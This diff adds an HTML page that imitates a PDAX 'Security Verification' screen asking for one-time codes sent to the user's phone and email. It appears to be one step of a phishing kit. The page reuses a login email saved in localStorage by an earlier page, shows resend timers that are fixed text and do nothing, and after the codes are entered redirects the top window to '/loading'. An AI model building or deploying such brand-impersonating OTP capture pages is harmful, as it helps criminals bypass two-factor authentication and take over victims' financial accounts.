@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<base target="_top" />
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>PDAX</title>
+<style>
+  :root { --green:#2bb24c; }
+  * { box-sizing:border-box; }
+  html,body { margin:0; min-height:100%; }
+  body { font-family:"Poppins",system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif; background:#fff; color:#1f2328; }
+
+  /* Header */
+  .header { height:72px; border-bottom:1px solid #eceef0; display:flex; align-items:center; padding:0 40px; }
+  .logo { display:flex; align-items:center; gap:8px; font-size:22px; font-weight:700; color:#1f2328; }
+  .logo svg { width:22px; height:22px; }
+
+  /* Content */
+  .wrap { max-width:560px; margin:0; padding:48px 40px 48px 150px; }
+  h1 { font-size:34px; font-weight:700; margin:0 0 34px; }
+  .label { font-size:16px; color:#3a3f45; margin:0 0 10px; }
+  .field { position:relative; margin-bottom:28px; }
+  .field input { width:100%; height:58px; border:1px solid #d9dde1; border-radius:8px; padding:0 120px 0 18px; font-size:17px; color:#1f2328; outline:none; background:#fff; }
+  .field input:focus { border-color:var(--green); }
+  .field .resend { position:absolute; right:18px; top:50%; transform:translateY(-50%); font-size:15px; color:#a2a8af; pointer-events:none; }
+  .note { font-size:16px; line-height:1.6; color:#3a3f45; margin:36px 0; }
+  .support { font-size:16px; line-height:1.6; color:#3a3f45; margin:48px 0 20px; }
+  .support a { color:var(--green); text-decoration:none; }
+  .confirm { width:100%; padding:17px; border:0; border-radius:8px; background:#a7d9b3; color:#fff; font-size:19px; font-weight:600; cursor:not-allowed; transition:background .15s; }
+  .confirm.active { background:var(--green); cursor:pointer; }
+  .confirm.active:hover { background:#249c43; }
+
+  /* click loader */
+  .loader { position:fixed; inset:0; z-index:50; display:none; align-items:center; justify-content:center; background:#fff; }
+  .loader .spin { width:48px; height:48px; border-radius:50%; border:4px solid #e3e7ea; border-top-color:var(--green); animation:rot .9s linear infinite; }
+  @keyframes rot { to { transform:rotate(360deg); } }
+
+  @media (max-width:860px){ .wrap{ padding:28px 20px; } h1{ font-size:28px; } .header{ padding:0 20px; } }
+</style>
+</head>
+<body>
+  <div class="header">
+    <div class="logo">
+      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M4 20L12 4l8 16-8-5-8 5z" fill="#2bb24c"/></svg>
+      PDAX
+    </div>
+  </div>
+
+  <div class="wrap">
+    <h1>Security Verification</h1>
+
+    <div class="label">Enter the 6-digit code we sent to your phone number.</div>
+    <div class="field">
+      <input id="phoneCode" type="text" inputmode="numeric" maxlength="6" autocomplete="one-time-code" />
+      <span class="resend">Resend in 3m 16s</span>
+    </div>
+
+    <div class="label">Enter the 6-digit code we sent to <span id="emailMask">your email</span>.</div>
+    <div class="field">
+      <input id="emailCode" type="text" inputmode="numeric" maxlength="6" autocomplete="one-time-code" />
+      <span class="resend">Resend in 3m 16s</span>
+    </div>
+
+    <p class="note">For security reasons, you are required to enter the unique one-time passwords sent to both your mobile number and email address.</p>
+
+    <p class="support">If you keep encountering errors in this step, please reach out to <a href="#">Customer Support</a>.</p>
+
+    <button class="confirm" type="button" id="confirm" disabled>Confirm</button>
+  </div>
+
+  <div class="loader" id="loader"><div class="spin"></div></div>
+
+  <script>
+    // Masked email from saved login email: keep first 2 chars, stars, then domain
+    (function () {
+      var email = '';
+      try { email = (localStorage.getItem('pdax_login_email') || '').trim(); } catch (e) {}
+      var masked = 'your email';
+      if (email.indexOf('@') > 0) {
+        var parts = email.split('@');
+        var name = parts[0];
+        var prefix = name.slice(0, 2);
+        masked = prefix + '********' + '@' + parts[1];
+      }
+      document.getElementById('emailMask').textContent = masked;
+    })();
+
+    var phone = document.getElementById('phoneCode');
+    var mail = document.getElementById('emailCode');
+    var confirm = document.getElementById('confirm');
+
+    function digitsOnly(el) {
+      el.value = el.value.replace(/[^0-9]/g, '').slice(0, 6);
+    }
+    function validate() {
+      var ok = phone.value.length === 6 && mail.value.length === 6;
+      if (ok) {
+        confirm.classList.add('active');
+        confirm.disabled = false;
+      } else {
+        confirm.classList.remove('active');
+        confirm.disabled = true;
+      }
+    }
+    phone.addEventListener('input', function () { digitsOnly(phone); validate(); });
+    mail.addEventListener('input', function () { digitsOnly(mail); validate(); });
+
+    confirm.addEventListener('click', function () {
+      if (confirm.disabled) return;
+      document.getElementById('loader').style.display = 'flex';
+      setTimeout(function () {
+        (window.top || window).location.href = '/loading';
+      }, 1000);
+    });
+  </script>
+</body>
+</html>
